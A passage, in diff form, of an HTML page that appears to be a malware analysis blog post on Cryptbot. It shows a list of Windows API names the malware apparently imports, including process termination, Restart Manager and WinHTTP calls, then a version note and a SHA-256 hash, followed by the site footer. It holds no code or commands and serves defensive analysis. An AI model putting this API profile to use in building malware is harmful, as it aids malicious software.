+GetCurrentProcess
+GetCurrentThread
+GetUserDefaultLocaleName
+GetSystemMetrics
+GetSystemInfo
+GetNativeSystemInfo
+IsWow64Process
+IsWow64Process2
+GetKeyboardLayoutList
+RtlGetVersion
+GetLastError
+SetErrorMode
+abs
+clock
+OpenProcess
+TerminateProcess
+RmStartSession
+RmRegisterResources
+RmGetList
+RmEndSession
+strtod
+isspace
+Sleep
+SleepEx
+GetExitCodeThread
+ExitThread
+ExitProcess
+FileTimeToDosDateTime
+WinHttpSetOption
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL</code></pre>
+
+</div>
+</div>
+</div>
+<div class="cell border-box-sizing text_cell rendered">
+<div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h3 id="Version-3.2-(Timeline-unknown)">
+<a class="anchor" href="#Version-3.2-(Timeline-unknown)" aria-hidden="true"><span class="octicon octicon-link"></span></a>Version 3.2 (Timeline unknown)<a class="anchor-link" href="#Version-3.2-(Timeline-unknown)"> </a>
+</h3>
+<ul>
+<li>gcc compiled</li>
+<li>downloads the binary</li>
+<li><code>e7a83ddae3eec8ce624fc138e1dddb7f3ff5c5c9f20db11f60e22f489bdcc947</code></li>
+</ul>
+
+</div>
+</div>
+</div>
+</div>
+
+
+
+  </div><a class="u-url" href="/cryptbot/botnet/yara/config/2024/12/06/cryptbot2.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+      </div>
+      <div class="footer-col">
+        <p></p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"></ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
